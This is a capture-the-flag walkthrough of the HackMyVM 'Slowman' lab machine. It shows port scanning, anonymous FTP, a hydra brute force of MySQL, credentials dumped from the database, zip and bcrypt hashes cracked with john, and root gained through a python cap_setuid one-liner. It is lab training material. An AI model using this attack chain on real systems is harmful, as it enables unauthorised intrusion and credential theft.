# Slowman

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.131:21
Open 10.0.2.131:22
Open 10.0.2.131:80
Open 10.0.2.131:3306
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.131
PORT     STATE SERVICE REASON  VERSION
21/tcp   open  ftp     syn-ack vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.0.2.15
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp   open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 02:d6:5e:01:45:5b:8d:2d:f9:cb:0b:df:45:67:04:22 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHvpW3SN59DMldQfBCLaMEgh2QLtUL3x/uo4WbSqvUfGi6CTSzOxLuEt8h39LROAW2fc2MLF2hmQUW2rzxqs5tM=
|   256 f9:ce:4a:75:07:d0:05:1d:fb:a7:a7:69:39:1b:08:10 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIAknwJ/xf/gfMTW6Cv22rM+W5ubiFBKo3uaRTvZY544
80/tcp   open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Fastgym
|_http-server-header: Apache/2.4.52 (Ubuntu)
3306/tcp open  mysql   syn-ack MySQL 8.0.35-0ubuntu0.22.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.35-0ubuntu0.22.04.1
|   Thread ID: 13
|   Capabilities flags: 65535
|   Some Capabilities: LongPassword, SupportsCompression, IgnoreSigpipes, LongColumnFlag, ConnectWithDatabase, Support41Auth, Speaks41ProtocolOld, SupportsTransactions, SwitchToSSLAfterHandshake, IgnoreSpaceBeforeParenthesis, ODBCClient, InteractiveClient, Speaks41ProtocolNew, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, FoundRows, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: r]?'~h\x0FC{ov|_jJ\x7F\x0F,\x1F^
|_  Auth Plugin Name: caching_sha2_password
| ssl-cert: Subject: commonName=MySQL_Server_8.0.35_Auto_Generated_Server_Certificate
| Issuer: commonName=MySQL_Server_8.0.35_Auto_Generated_CA_Certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-11-22T19:44:52
| Not valid after:  2033-11-19T19:44:52
| MD5:   1c45:069f:0fcf:a1b9:fdf0:8a89:ad87:5849
| SHA-1: ace4:73c6:e44e:066c:4562:798a:daef:689f:39e5:b17d
| -----BEGIN CERTIFICATE-----
| MIIDBzCCAe+gAwIBAgIBAjANBgkqhkiG9w0BAQsFADA8MTowOAYDVQQDDDFNeVNR
| TF9TZXJ2ZXJfOC4wLjM1X0F1dG9fR2VuZXJhdGVkX0NBX0NlcnRpZmljYXRlMB4X
| DTIzMTEyMjE5NDQ1MloXDTMzMTExOTE5NDQ1MlowQDE+MDwGA1UEAww1TXlTUUxf
| U2VydmVyXzguMC4zNV9BdXRvX0dlbmVyYXRlZF9TZXJ2ZXJfQ2VydGlmaWNhdGUw
| ggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDhny9jlLtd1RPaZgJwZVMv
| os2tEjXEAbjz0urprKjOniWdj5EjMz9ceg/rKoxZRU92GIxA6aW3DvPFgENb6ALA
| AsWRObvqiTLbq0tvSMWnTyaFEfUZDBXf5gK+/noxDYHsqH+HYc/XEUAjiUEqksYI
| RSClSA6Wg+au3nZEoXuXmL5i5ie0MVDs0Iy1nTkb1YQ8jPDK7SNtlcWAF+sJ53Xl
| Cp3xBKXE7zTRkZQan2Uv7ITwz1M0klXaxBi6ciDxSDs648NbjmoYApwxOpQA98+W
| vD8E1bLgU6+St+X75Mlw3SA3WAK8MSwVQaProLH6V+Wnv9wE9a3qbM6/o+fa6pgL
| AgMBAAGjEDAOMAwGA1UdEwEB/wQCMAAwDQYJKoZIhvcNAQELBQADggEBAIFHX+gx
| D+I9fJG+yBtP9v8JBg+zrKHFTU1PON4lnPTUL6nEcYz0uHFB4DeAcyVIkYvvpfwy
| 2GzhE6x3gsBWA4zHuIC5YPFFPdsT0EwIu3H5qpxYZyJ/1OgpRKejKs8FXqLbuqot
| rszkkiWUL5gSQEm0SyVieyldqmcds4uS/lPSVSL9t1RM68vIKD0peDpdTOHt6yd5
| Ekwnuf6z6WrFr2cnJXpEOnYCriLcYagJkgZloEAvhfiiDSOJJSLZ3in0kFWWpTDj
| R5sBGcTDnY/7rDVmDkgyG1zCOoDNp8Zdl5uQ9iXvWB2GW6HAn2A/fzLaDItBTZ8H
| t1SRIdKABEPAgjE=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## FTP

```bash
└─$ ftp anonymous@10.0.2.131
ftp> ls
229 Entering Extended Passive Mode (|||36789|)
# Hangs
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls
-rw-r--r--    1 0        0              12 Nov 22  2023 allowedusersmysql.txt
ftp> get allowedusersmysql.txt
ftp> put allowedusersmysql.txt
550 Permission denied.
ftp> exit
```

```bash
└─$ cat allowedusersmysql.txt
trainerjeff
```

## MySQL

```bash
└─$ hydra -l trainerjeff -P $rockyou 10.0.2.131 mysql -t 64 -I
[3306][mysql] host: 10.0.2.131   login: trainerjeff   password: soccer1
```

::: info Creds
`trainerjeff:soccer1`
:::

```bash
└─$ mysql -h 10.0.2.131 -u'trainerjeff' -p'soccer1' --skip-ssl -e 'SHOW DATABASES;'
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| trainers_db        |
+--------------------+

└─$ mysql -h 10.0.2.131 -u'trainerjeff' -p'soccer1' --skip-ssl trainers_db -e 'SHOW TABLES;'
+-----------------------+
| Tables_in_trainers_db |
+-----------------------+
| users                 |
+-----------------------+

└─$ mysql -h 10.0.2.131 -u'trainerjeff' -p'soccer1' --skip-ssl trainers_db -e 'SELECT * FROM users;'
+----+-----------------+-------------------------------+
| id | user            | password                      |
+----+-----------------+-------------------------------+
|  1 | gonzalo         | tH1sS2stH3g0nz4l0pAsSWW0rDD!! |
|  2 | $SECRETLOGINURL | /secretLOGIN/login.html       |
+----+-----------------+-------------------------------+
```

## HTTP

![writeup.png](/assets/pentest/hackmyvm/slowman/writeup.png)

- Login: [http://10.0.2.131/secretLOGIN/login.html/](http://10.0.2.131/secretLOGIN/login.html/)
- Credentials: [http://10.0.2.131/secretgym/serverSHARE/](http://10.0.2.131/secretgym/serverSHARE/)

![writeup-1.png](/assets/pentest/hackmyvm/slowman/writeup-1.png)

```bash
└─$ curl http://10.0.2.131/secretgym/serverSHARE/credentials.zip -Os
└─$ unzip credentials.zip
Archive:  credentials.zip
[credentials.zip] passwords.txt password:
```

```bash
└─$ zip2john credentials.zip | tee credentials.zip.hash
ver 2.0 efh 5455 efh 7875 credentials.zip/passwords.txt PKZIP Encr: TS_chk, cmplen=117, decmplen=117, crc=4981406D ts=9E02 cs=9e02 type=8
credentials.zip/passwords.txt:$pkzip$1*1*2*0*75*75*4981406d*0*47*8*75*9e02*3d18e37d2a6301a800b7e7f7add8da25b3fda087000ce2c2d53a9e938b4a85567a045ab60e7b2729e7b0c1a5b60cf3cf30fd26f916df89f60dde060745f7c2f6d2f818174b62fa4c52bf892f596383647a62f405eb1e2b53416576fe40cce2fdae320238f36a11dbe5bad54c2ca13e54271cfe661d*$/pkzip$:passwords.txt:credentials.zip::credentials.zip
```

```powershell
➜ john.exe \Users\Public\hashes.txt --wordlist=\Users\Public\rockyou.txt
spongebob1       (credentials.zip/passwords.txt)
```

```bash
└─$ unzip credentials.zip
Archive:  credentials.zip
[credentials.zip] passwords.txt password:
  inflating: passwords.txt

└─$ cat passwords.txt
----------
$USERS: trainerjean
$PASSWORD: $2y$10$DBFBehmbO6ktnyGyAtQZNeV/kiNAE.Y3He8cJsvpRxIFEhRAUe1kq
----------
```

## SSH (trainerjean)

```powershell
➜ john.exe \Users\Public\hashes.txt --wordlist=\Users\Public\rockyou.txt
tweety1          (trainerjean)
```

```bash
└─$ sshpass -p 'tweety1' ssh trainerjean@10.0.2.131
trainerjean@slowman:~$ id
uid=1002(trainerjean) gid=1002(trainerjean) groups=1002(trainerjean)
```

### User.txt

```bash
trainerjean@slowman:~$ cat user.txt
YOU9et7HEpA$SwordofS10wMan!!
```

## Privilege Escalation (gonzalo)

Sus?
```bash
trainerjean@slowman:~$ cat .python_history
import os
os.system('bash')
os.system('0')
os.setid('0')
os.setuid('0')
exit
```

There's hidden login page on webserver
```bash
trainerjean@slowman:/var/www/html/secretLOGIN$ cat l0gin.js
...
function login(username, password) {
    // Puedes realizar una solicitud AJAX al servidor para verificar las credenciales
    // En este ejemplo, simplemente redirigimos al usuario si las credenciales son correctas
    if (username === "gonzalo" && password === "tH1sS2stH3g0nz4l0pAsSWW0rDD!!") {
        window.location.href = "/secretgym/";
    } else {
        alert("Incorrect user or password!");
    }
}
trainerjean@slowman:/var/www/html/secretLOGIN$ su gonzalo
Password:
gonzalo@slowman:/var/www/html/secretLOGIN$ id
uid=1003(gonzalo) gid=1003(gonzalo) groups=1003(gonzalo)
```

::: info Creds
`gonzalo:tH1sS2stH3g0nz4l0pAsSWW0rDD!!`
:::

## Privilege Escalation (root)

```bash
gonzalo@slowman:~$ getcap -r / 2>/dev/null
/snap/core20/2015/usr/bin/ping cap_net_raw=ep
/snap/core20/2682/usr/bin/ping cap_net_raw=ep
/snap/snapd/25577/usr/lib/snapd/snap-confine cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_setgid,cap_setuid,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin=p
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/python3.10 cap_setuid=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep
```

- [https://gtfobins.github.io/gtfobins/python/#capabilities](https://gtfobins.github.io/gtfobins/python/#capabilities)

```bash
gonzalo@slowman:~$ python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@slowman:~# id
uid=0(root) gid=1003(gonzalo) groups=1003(gonzalo)
```

### Root.txt

```bash
root@slowman:~# cat /root/root.txt
Y0UGE23t7hE515roo7664pa5$WoRDOFSlowmaN!!
```